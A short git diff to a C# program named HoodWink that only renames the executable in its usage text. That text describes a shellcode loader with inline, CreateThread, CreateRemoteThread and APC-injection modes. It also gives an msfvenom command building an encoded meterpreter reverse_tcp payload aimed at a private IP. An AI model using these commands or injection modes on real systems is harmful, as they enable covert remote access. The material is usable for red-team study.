@@ -64,11 +64,11 @@ namespace HoodWink
         {
             Console.ForegroundColor = ConsoleColor.Yellow;
             Console.WriteLine("Usage: ");
-            Console.WriteLine("  ./Deception.exe msf.bin -i       # for inline");
-            Console.WriteLine("  ./Deception.exe msf.bin -t       # for inline: CreateThread");
-            Console.WriteLine("  ./Deception.exe msf.bin -r       # for remote: CreateRemoteThread via given PID");
-            Console.WriteLine("  ./Deception.exe msf.bin -s       # for remote: Spawn notepad.exe and Queue APC inject");
-            Console.WriteLine("  ./Deception.exe msf.bin -a       # makes all of the above");
+            Console.WriteLine("  ./HoodWink.exe msf.bin -i       # for inline");
+            Console.WriteLine("  ./HoodWink.exe msf.bin -t       # for inline: CreateThread");
+            Console.WriteLine("  ./HoodWink.exe msf.bin -r       # for remote: CreateRemoteThread via given PID");
+            Console.WriteLine("  ./HoodWink.exe msf.bin -s       # for remote: Spawn notepad.exe and Queue APC inject");
+            Console.WriteLine("  ./HoodWink.exe msf.bin -a       # makes all of the above");
             Console.WriteLine("Payload Examples: ");
             Console.WriteLine("   msfbin: msfvenom -p windows/x64/exec -f raw CMD=calc.exe -o msf.bin");
             Console.WriteLine("   msfbin: msfvenom -p windows/x64/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 LHOST=192.168.159.138 LPORT=8080 -f raw -o msf.bin");
